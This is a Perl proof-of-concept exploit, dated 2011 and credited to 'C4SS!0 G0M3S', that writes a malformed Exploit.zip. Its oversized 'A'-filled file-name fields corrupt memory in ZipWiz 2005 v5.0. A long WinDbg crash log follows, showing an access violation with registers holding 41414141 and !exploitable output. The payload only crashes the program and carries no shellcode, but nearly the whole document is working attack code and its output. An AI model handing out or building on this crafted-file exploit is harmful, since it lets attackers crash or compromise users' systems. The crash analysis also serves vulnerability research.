#!/usr/bin/perl
#
#[+]Exploit Title: ZipWiz 2005 v5.0 .ZIP File Buffer Corruption Exploit
#[+]Date: 08\07\2011
#[+]Author: C4SS!0 G0M3S
#[+]Software Link: http://download.cnet.com/ZipWiz-2005/3000-2250_4-10011590.html
#[+]Version: v5.0
#[+]Tested On: WIN-XP SP3 Brazilian Portuguese
#[+]CVE: N/A
#
#

use strict;
use warnings;

my $filename = "Exploit.zip"; 

print "\n\n\t\tZipWiz 2005 v5.0 .ZIP File Buffer Corruption Exploit\n";
print "\t\tCreated by C4SS!0 G0M3S\n";
print "\t\tE-mail Louredo_\@hotmail.com\n";
print "\t\tSite www.exploit-br.org/\n\n";
sleep(1);

my $head = "\x50\x4B\x03\x04\x14\x00\x00".
"\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00" .
"\x00\x00\x00\x00\x00\x00\x00\x00" .
"\xe4\x0f" .
"\x00\x00\x00";

my $head2 = "\x50\x4B\x01\x02\x14\x00\x14".
"\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00" .
"\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\xe4\x0f".
"\x00\x00\x00\x00\x00\x00\x01\x00".
"\x24\x00\x00\x00\x00\x00\x00\x00";

my $head3 = "\x50\x4B\x05\x06\x00\x00\x00".
"\x00\x01\x00\x01\x00".
"\x12\x10\x00\x00".
"\x02\x10\x00\x00".
"\x00\x00";

my $payload = "A" x 4064;

$payload = $payload.".txt";
my $zip = $head.$payload.$head2.$payload.$head3;
open(FILE,">$filename") || die "[-]Error:\n$!\n";
print FILE $zip;
close(FILE);
print "[+] ZIP File Created With Sucess:)\n";
sleep(3);

=head1

(314.e4): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=41414141 ebx=00bd7e50 ecx=55555551 edx=000eaac8 esi=00bd5290 edi=0050a1e4
eip=0045de1a esp=0006eaac ebp=0006eab8 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=0038  gs=0000             efl=00010202
image00400000+0x5de1a:
0045de1a 8b44ca5c        mov     eax,dword ptr [edx+ecx*8+5Ch] ds:0023:aab955ac=????????
0:000> .exr -1
ExceptionAddress: 0045de1a (image00400000+0x0005de1a)
   ExceptionCode: c0000005 (Access violation)
  ExceptionFlags: 00000000
NumberParameters: 2
   Parameter[0]: 00000000
   Parameter[1]: aab955ac
Attempt to read from address aab955ac
0:000> dd edx
000eaac8  ffffffff ffffffff 00140014 00000000
000eaad8  34ceacb7 00000000 00000000 00000000
000eaae8  00000fe4 00000000 00240001 00000000
000eaaf8  00010000 00000000 0fe60000 01040000
000eab08  00000000 ffffffff ffffffff 00000000
000eab18  00000000 ffffffff ffffffff 00000006
000eab28  ba000000 baadf00d baadf00d baadf00d
000eab38  baadf00d ba00000d baadf00d 00adf00d
0:000> r
eax=41414141 ebx=00bd7e50 ecx=55555551 edx=000eaac8 esi=00bd5290 edi=0050a1e4
eip=0045de1a esp=0006eaac ebp=0006eab8 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=0038  gs=0000             efl=00010202
image00400000+0x5de1a:
0045de1a 8b44ca5c        mov     eax,dword ptr [edx+ecx*8+5Ch] ds:0023:aab955ac=????????
0:000> !load winext/msec.dll
0:000> !exploitable -v
HostMachine\HostUser
Executing Processor Architecture is x86
Debuggee is in User Mode
Debuggee is a live user mode debugging session on the local machine
Event Type: Exception
Exception Faulting Address: 0xffffffffaab955ac
First Chance Exception Type: STATUS_ACCESS_VIOLATION (0xC0000005)
Exception Sub-Type: Read Access Violation

Faulting Instruction:0045de1a mov eax,dword ptr [edx+ecx*8+5ch]

Basic Block:
    0045de1a mov eax,dword ptr [edx+ecx*8+5ch]
       Tainted Input Operands: ecx, edx
    0045de1e cmp eax,8
       Tainted Input Operands: eax
    0045de21 ja image00400000+0x5de4d (0045de4d)
       Tainted Input Operands: ZeroFlag, CarryFlag

Exception Hash (Major/Minor): 0x00020e6f.0x3f7f6d68

Stack Trace:
image00400000+0x5de1a
image00400000+0x1e773
image00400000+0x1ef50
image00400000+0x1f024
image00400000+0xc0312
image00400000+0xbffef
image00400000+0xbee0f
image00400000+0xbf0c4
USER32!InternalCallWinProc+0x28
USER32!UserCallWinProcCheckWow+0x150
USER32!DispatchClientMessage+0xa3
USER32!__fnDWORD+0x24
ntdll!KiUserCallbackDispatcher+0x13
USER32!NtUserCallHwndLock+0xc
image00400000+0x165a
image00400000+0x538c5
image00400000+0x69b35
image00400000+0x6861a
image00400000+0x24947
image00400000+0xc041e
image00400000+0xbffef
image00400000+0xbee0f
image00400000+0xbf0c4
USER32!InternalCallWinProc+0x28
USER32!UserCallWinProcCheckWow+0x150
USER32!DispatchMessageWorker+0x306
USER32!DispatchMessageA+0xf
image00400000+0xc373c
image00400000+0xc31d8
image00400000+0xc49f3
Instruction Address: 0x000000000045de1a

Description: Data from Faulting Address controls Branch Selection
Short Description: TaintedDataControlsBranchSelection
Exploitability Classification: UNKNOWN
Recommended Bug Title: Data from Faulting Address controls Branch Selection starting at image00400000+0x000000000005de1a (Hash=0x00020e6f.0x3f7f6d68)

The data from the faulting address is later used to determine whether or not a branch is taken.
0:000> !analyze -v
*******************************************************************************
*                                                                             *
*                        Exception Analysis                                   *
*                                                                             *
*******************************************************************************

GetPageUrlData failed, server returned HTTP status 404
URL requested: http://watson.microsoft.com/StageOne/image00400000/4_0_0_0/image00400000/4_0_0_0/0005de1a.htm?Retriage=1

FAULTING_IP: 
image00400000+5de1a
0045de1a 8b44ca5c        mov     eax,dword ptr [edx+ecx*8+5Ch]

EXCEPTION_RECORD:  ffffffff -- (.exr 0xffffffffffffffff)
ExceptionAddress: 0045de1a (image00400000+0x0005de1a)
   ExceptionCode: c0000005 (Access violation)
  ExceptionFlags: 00000000
NumberParameters: 2
   Parameter[0]: 00000000
   Parameter[1]: aab955ac
Attempt to read from address aab955ac

FAULTING_THREAD:  000000e4

PROCESS_NAME:  image00400000

ERROR_CODE: (NTSTATUS) 0xc0000005 - A instru  o no "0x%08lx" fez refer ncia   mem ria no "0x%08lx". A mem ria n o p de ser "%s".

EXCEPTION_CODE: (NTSTATUS) 0xc0000005 - A instru  o no "0x%08lx" fez refer ncia   mem ria no "0x%08lx". A mem ria n o p de ser "%s".

EXCEPTION_PARAMETER1:  00000000

EXCEPTION_PARAMETER2:  aab955ac

READ_ADDRESS:  aab955ac 

FOLLOWUP_IP: 
image00400000+5de1a
0045de1a 8b44ca5c        mov     eax,dword ptr [edx+ecx*8+5Ch]

MOD_LIST: <ANALYSIS/>

NTGLOBALFLAG:  70

APPLICATION_VERIFIER_FLAGS:  0

BUGCHECK_STR:  APPLICATION_FAULT_INVALID_POINTER_READ_FILL_PATTERN_41414141

PRIMARY_PROBLEM_CLASS:  INVALID_POINTER_READ_FILL_PATTERN_41414141

DEFAULT_BUCKET_ID:  INVALID_POINTER_READ_FILL_PATTERN_41414141

LAST_CONTROL_TRANSFER:  from 0041e773 to 0045de1a

STACK_TEXT:  
WARNING: Stack unwind information not available. Following frames may be wrong.
0006eab8 0041e773 00570d20 00bd7e50 00bd541c image00400000+0x5de1a
0006eb18 0041ef50 00bd5290 00bd5290 0041efa0 image00400000+0x1e773
0006eb44 0041f024 003ef170 00000000 0050a1e4 image00400000+0x1ef50
0006ebd4 004c0312 00bd5290 00bd5290 000a7320 image00400000+0x1f024
0006ec48 004bffef 0000000f 00000000 004f3de0 image00400000+0xc0312
0006ec68 004bee0f 0000000f 00000000 00000000 image00400000+0xbffef
0006ecc8 004bf0c4 00bd5290 000601b6 0000000f image00400000+0xbee0f
0006ece4 7e368734 000601b6 0000000f 00000000 image00400000+0xbf0c4
0006ed10 7e368816 004bf099 000601b6 0000000f USER32!InternalCallWinProc+0x28
0006ed78 7e378ea0 00000000 004bf099 000601b6 USER32!UserCallWinProcCheckWow+0x150
0006edcc 7e378eec 00784cd0 0000000f 00000000 USER32!DispatchClientMessage+0xa3
0006edf4 7c90e473 0006ee04 00000018 00784cd0 USER32!__fnDWORD+0x24
0006ee18 7e37aef1 7e37aedc 0006019e 0000005e ntdll!KiUserCallbackDispatcher+0x13
0006ee2c 0040165a 0006019e 004534b6 00000074 USER32!NtUserCallHwndLock+0xc
0006ee48 004538c5 00000001 0058c770 00000000 image00400000+0x165a
0006ee9c 00469b35 0052ca80 00000000 0058c770 image00400000+0x538c5
0006eec8 0046861a 00bd489c 00000000 0052ca80 image00400000+0x69b35
0006eeec 00424947 00bd489c 0052c404 00bd1530 image00400000+0x6861a
0006fcc8 004c041e 00bd4740 00000000 00bd1530 image00400000+0x24947
0006fd44 004bffef 00000425 00bd4740 004f5170 image00400000+0xc041e
0006fd64 004bee0f 00000425 00bd4740 00000000 image00400000+0xbffef
0006fdc4 004bf0c4 00bd1530 002201dc 00000425 image00400000+0xbee0f
0006fde0 7e368734 002201dc 00000425 00bd4740 image00400000+0xbf0c4
0006fe0c 7e368816 004bf099 002201dc 00000425 USER32!InternalCallWinProc+0x28
0006fe74 7e3689cd 00000000 004bf099 002201dc USER32!UserCallWinProcCheckWow+0x150
0006fed4 7e3696c7 0058c7a0 00000001 0058c7a0 USER32!DispatchMessageWorker+0x306
0006fee4 004c373c 0058c7a0 00000001 0058c770 USER32!DispatchMessageA+0xf
0006fef4 004c31d8 ffffffff 0058c770 0006ffc0 image00400000+0xc373c
0006ff0c 004c49f3 0058c770 004c55d5 010ef6ee image00400000+0xc31d8
00000000 00000000 00000000 00000000 00000000 image00400000+0xc49f3


SYMBOL_STACK_INDEX:  0

SYMBOL_NAME:  image00400000+5de1a

FOLLOWUP_NAME:  MachineOwner

MODULE_NAME: image00400000

DEBUG_FLR_IMAGE_TIMESTAMP:  4399fa20

STACK_COMMAND:  ~0s ; kb

BUCKET_ID:  APPLICATION_FAULT_INVALID_POINTER_READ_FILL_PATTERN_41414141_image00400000+5de1a

IMAGE_NAME:  C:\Program files\ZipWiz\ZWP32.EXE

FAILURE_BUCKET_ID:  INVALID_POINTER_READ_FILL_PATTERN_41414141_c0000005_C:_Program_files_ZipWiz_ZWP32.EXE!Unknown

WATSON_STAGEONE_URL:  http://watson.microsoft.com/StageOne/image00400000/4_0_0_0/4399fa20/image00400000/4_0_0_0/4399fa20/c0000005/0005de1a.htm?Retriage=1

Followup: MachineOwner
---------

0:000> lmvm image00400000
start    end        module name
00400000 0063f000   image00400000 C (no symbols)           
    Loaded symbol image file: C:\Program files\ZipWiz\ZWP32.EXE
    Image path: image00400000
    Image name: image00400000
    Timestamp:        Fri Dec 09 19:41:52 2005 (4399FA20)
    CheckSum:         00000000
    ImageSize:        0023F000
    File version:     4.0.0.0
    Product version:  4.0.0.0
    File flags:       0 (Mask 3F)
    File OS:          40004 NT Win32
    File type:        1.0 App
    File date:        00000000.00000000
    Translations:     0409.04b0
    CompanyName:      Synaptek Software
    ProductName:      Zip Wizard Pro(tm)
    InternalName:     zwp32
    OriginalFilename: zwp32.exe
    ProductVersion:   4, 0, 0, 0
    FileVersion:      4, 0, 0, 0
    FileDescription:  ZipWiz application file
    LegalCopyright:   Copyright � 1994-2005 Synaptek Software
    LegalTrademarks:  Synaptek, IntelliZip,ZipWiz Explorer,ZipWiz Navigator, ZipWiz, Zip Wizard Pro, Zip Pro are trademarks of Synaptek Software.
0:000> .exr 0xffffffffffffffff
ExceptionAddress: 0045de1a (image00400000+0x0005de1a)
   ExceptionCode: c0000005 (Access violation)
  ExceptionFlags: 00000000
NumberParameters: 2
   Parameter[0]: 00000000
   Parameter[1]: aab955ac
Attempt to read from address aab955ac
0:000> g
(314.e4): Access violation - code c0000005 (!!! second chance !!!)
eax=41414141 ebx=00bd7e50 ecx=55555551 edx=000eaac8 esi=00bd5290 edi=0050a1e4
eip=0045de1a esp=0006eaac ebp=0006eab8 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=0038  gs=0000             efl=00000202
image00400000+0x5de1a:
0045de1a 8b44ca5c        mov     eax,dword ptr [edx+ecx*8+5Ch] ds:0023:aab955ac=????????

=cut




